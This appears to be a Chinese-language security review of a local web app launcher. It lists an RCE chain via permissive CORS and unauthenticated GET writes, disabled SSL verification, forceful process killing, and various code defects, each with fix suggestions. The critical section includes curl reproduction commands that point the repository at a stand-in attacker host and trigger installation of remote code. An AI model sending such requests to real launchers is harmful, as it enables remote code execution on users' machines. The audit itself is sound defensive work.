## 二、🔴 严重隐患：安全边界

### 2.1 任意网页可远程安装并执行任意代码（RCE）

**实测复现**（启动 launcher 后，模拟恶意网页发起的请求）：

```bash
# ① 恶意网页改写仓库地址（simple POST，不触发 CORS 预检）
curl -X POST -H "Content-Type: text/plain" -H "Origin: http://evil.example.com" \
     -d '{"url":"http://attacker.local"}' http://127.0.0.1:8000/api/repo/config
→ {"ok": true, "msg": "已保存，配置已实时刷新"}

# ② 触发安装（GET，用 <img src> 即可发出，浏览器不需要读响应）
curl -H "Origin: http://evil.example.com" \
     "http://127.0.0.1:8000/api/install?id=xxx"
→ 从攻击者服务器拉 zip → 解压 → 可执行代码落地
```

**成因**（`launcher/http_handler.py`）：

1. 第 49 行：`Access-Control-Allow-Origin: *` 加在**所有** JSON 响应上，无 Origin 校验
2. 写操作全部是 **GET**：`/api/install`、`/api/uninstall`、`/api/open`、`/api/close`、`/api/launcher/update`
3. 无任何鉴权、无 token、无 `Sec-Fetch-Site` / `Origin` 校验
4. `/api/repo/config`（第 136 行）**明文回传 `auth_pass`**，配合 `*` 可被任意站点读取

用户只要开着 launcher 浏览器访问一个恶意页面，整条链就通了。
当前 `config.json` 的 `auth` 为 `null` 所以凭据是空的——**一旦配置了仓库账号密码，就是明文泄露**。

> 已还原测试中改写的 `repo.url`（`http://attacker.local` → `https://1.15.30.237`）。

**为什么现在没出事**：默认 `host = 127.0.0.1`，攻击面限于本机浏览器。
但 README 的嵌入式部署章节教用户改成 `0.0.0.0`，届时同网段任何人都能打。

**修复建议**（按性价比排序）：

```python
# ① CORS 改为本机来源白名单（不能直接删除 * —— store 应用跨域调用依赖它）
_local_hosts = {"127.0.0.1", "localhost", "::1", "[::1]"}
origin = self.headers.get("Origin") or ""
o = urlparse(origin)
if o.hostname in _local_hosts:
    self.send_header("Access-Control-Allow-Origin", origin)
    self.send_header("Vary", "Origin")
# 非本地来源不回 ACAO → 浏览器自动拦截响应读取

# ② 写操作加来源校验（挡住 <img>/<form> 型 CSRF，CORS 拦不住请求发出）
if self.headers.get("Sec-Fetch-Site") == "cross-site":
    return self._json({"ok": False, "msg": "拒绝跨站请求"})

# ③ /api/repo/config 不回传 auth_pass（只回是否已配置）
```

注意：store 应用（`system/store/app.py:333`）是 `fetch('http://127.0.0.1:8000/api/...')`
从 8100 端口发起的**跨端口**调用，所以**不能简单禁用 CORS**，必须用白名单方案。

### 2.2 仓库通信关闭 SSL 校验 + 裸 IP 地址

```json
"repo": { "url": "https://1.15.30.237", "verify_ssl": false }
```

`verify_ssl: false` 意味着 HTTPS 的证书链校验被跳过。配合裸 IP（无法做主机名绑定校验），
任何能劫持链路的中间人都可以冒充仓库下发恶意应用包，而 sha256 也来自同一个被劫持的 index——校验形同虚设。

**建议**：换成正式域名 + 有效证书，开启 `verify_ssl`；如果坚持自签证书，
至少应把服务器证书指纹**钉死**在 config 里（certificate pinning），而不是关闭校验。

### 2.3 `tools/kill.bat` 是核弹

```bat
taskkill /F /IM python.exe
```

无差别杀掉机器上**所有** python 进程（包括用户自己的其他项目、ROS 节点、iqcache-sync 后台同步）。
建议改为只杀 launcher 的子进程树，或至少在文件里加醒目提示。

## 三、🟠 高危隐患

### 3.1 ros 分组存在两份副本且已分叉

```
web-launcher/apps/ros/          ← 真实目录
web-launcher-apps/apps/ros/     ← 真实目录（不是 junction）
```

对比结果：**40 个文件，8 个内容不同**（7 个 `app.py` + `_http.py`）。差异性质：

```diff
# web-launcher-apps 版本（更新）：
- port = config.get("port")
+ port = config.get("port") or config.get("port ")   # 为 "port " 拼写错误打的补丁，但该 bug 已不存在 → 死代码

- ThreadingHTTPServer(("127.0.0.1", PORT), H).serve_forever()
+ ThreadingHTTPServer((os.environ.get("APP_HOST", "127.0.0.1"), PORT), H).serve_forever()   # 支持远程部署
```

`web-launcher` 那份**不支持 `APP_HOST`**，在 `host=0.0.0.0` 的嵌入式部署下，ros 应用仍只监听 127.0.0.1 → 远程打不开。
这是"改了一份忘了另一份"的典型分叉，迟早出事。

**建议**：二选一保留，`apps/ros` 做成 junction 指向另一份（和 general/game 一样的做法）。

### 3.2 `.gitignore` 裸名规则会误伤

```
11: apps/etws
12: apps/general
13: ros          ← 裸名：任意层级的 ros/ 目录都被忽略
19: game
20: etws
21: general
22: ros          ← 重复
```

裸名 `ros`/`game`/`etws`/`general` 会匹配**任意层级**同名目录。
将来某个应用内部有个 `ros/` 或 `general/` 子目录，会被静默排除出版本控制——且极难排查。
另外 `ros` 重复了两行。

**建议**：全部改成锚定路径 `apps/ros` `/apps/game` `/apps/etws` `/apps/general`，删掉重复行。

### 3.3 关闭应用是 `taskkill /F`，无优雅退出

`process_manager.close_app()` 直接 `taskkill /F /T`，等价于 SIGKILL——**应用没有任何清理机会**。

对 `iqcache-sync` 这类正在写 NAS 的同步工具，强杀意味着：
- 缓冲区数据丢失
- NAS 上留下半截文件（而这恰恰是该工具要解决的时间戳/一致性问题的反面）

**建议**：先发优雅信号（Windows 可用 `CTRL_BREAK_EVENT`，POSIX 用 `SIGTERM`），
等待 N 秒（可配置，如 3s）后再 `taskkill /F`。给应用留出 flush 窗口。

### 3.4 `layout.json` 的覆盖语义是个陷阱

已在 09-04 踩过一次：只要 `layout.json` 存在 `dock` 字段，就**全权覆盖** `app.json` 的出厂 `dock: true`。
任何通过 `POST /api/layout` 传空数组的调用（哪怕只是为了触发 `reload_apps`）都会清空 Dock。

**建议**：让 `apply_layout` 在 `dock` 为 `null`/缺失时回退到 `app.json` 默认值；
或者把"重扫注册表"拆成独立端点（如 `POST /api/reload`），不要复用布局保存接口。

## 四、🟡 中等问题

### 4.1 端口分配存在 TOCTOU 竞态

`process_manager._alloc_port()`：bind 测试端口可用 → 立即 close → app 再去 bind。
这中间有窗口，高并发启动时会分到已被占用的端口。代码注释里已承认。

**建议**：把测试用的 socket 保持 `SO_REUSEADDR` 并通过句柄传给子进程，或失败后重试并校验。

### 4.2 启动失败会残留脏状态

`open_app()` 在进程崩溃/超时路径（第 226/232/235 行）直接 return，
但 `procs[aid]` 仍指向已死的 Popen、`actual_ports[aid]` 仍保留旧端口。
前端 `/api/apps` 会看到一个 `running=false` 但 `actual_port=8160` 的应用，可能误导。

**建议**：失败分支补 `procs.pop(aid, None)` + `actual_ports.pop(aid, None)`。

### 4.3 `resolve_cmd` 的路径假设脆弱

```python
out.append(str(app_dir.parents[2] / p) if not p.is_absolute() else str(p))
```

硬编码 `parents[2]` 假设应用目录严格是 `<root>/apps/<group>/<id>/`。
一旦出现 `apps/general/tools/foo/app.json` 这类嵌套，就会拼出错误路径。

**建议**：用 `config.BASE` 直接拼接，或在扫描时记录每个 app 相对 `APPS_DIR` 的层级。

### 4.4 每次 reload 全盘扫描两遍

`reload_apps()` → `load_system_apps()` + `load_user_apps()` → 各自调用 `_scan_all_apps()`，
等于把 `apps/` 完整遍历、解析所有 `app.json` **两次**。应用数量增长后 reload 会明显变慢。

**建议**：扫一次，按 `system` 标记 partition 成两份。

### 4.5 模块导入即扫描磁盘（副作用）

`app_registry.py:162` 在模块级调用 `reload_apps()`，导入即产生磁盘 I/O 和全局状态。
`http_handler` 又在 `POST /api/layout` 里再调一次 → 实际扫了 4 遍。

**建议**：改为惰性初始化或显式 `init()`，便于测试与性能控制。

### 3.5 端口分区约定与实际不符（历史遗留）

`apps/README.md` 声明的分区是 `system 8100-8109 / etws 8110-8169 / user 8120-8139 / general 8140-8159 /
game 8173-8184 / ros 8201-8209`。实际扫描 51 个应用后，越界的有 8 个：

| 应用 | 分组 | 实际端口 | 落在谁的区段 |
|---|---|---|---|
| calculator | system | 8140 | general 段 |
| md-viewer | system | 8154 | general 段 |
| todo | user | 8101 | system 段（与 store 8100 / clock 8102 挤在一起） |
| log-viewer | user | 8151 | general 段 |
| cron-ui | user | 8152 | general 段 |
| nixie-clock | user | 8168 | etws 段 |
| notes | general | 8120 | user 段 |
| iqcache-sync | etws | 8210 | ros 段外侧 |

**当前无真实冲突**（launcher 的 `port_conflict` 检测已确认），但分区约定形同虚设，
将来按文档给 general 分配新端口时极易撞上 calculator。
`game` 与 `ros` 两组是干净的（09-04 刚按分区重排过）。

**建议**：二选一——
- 把 system/user/etws/general 剩余的 8 个端口也按分区重排（改动小，需注意 iqcache-sync 是业务工具，改端口可能影响书签/脚本）
- 或者干脆按**实际现状**重写文档里的分区表（承认历史分布，只约束新应用）

## 五、做得好的地方（值得保留的设计）

- **zip-slip 防护**（`zipio.py`）：双次 `..` 检查 + 路径前缀剥离 + 原子替换，失败不污染目标目录
- **HTML 转义**（`frontend.py:_escape`）：icon/name 等应用可控字段全部转义，防 XSS
- **日志轮转**（`config.py`）：`RotatingFileHandler` 5MB × 3，`safe_print` 统一 `print` 避免 `-w` 模式崩溃
- **进程树清理**（`process_manager`）：`taskkill /F /T` / `killpg` 避免 ROS 节点这类子进程成孤儿
- **端口冲突检测**（`_mark_port_conflicts`）：主动标记并在前端打 ⚠️ 角标
- **内嵌 runtime 优先**（`_prep_cmd`）：随身 Python 优先于系统 Python，版本可控
- **原子配置写入**：`save_repo_config` 原子写 + reload
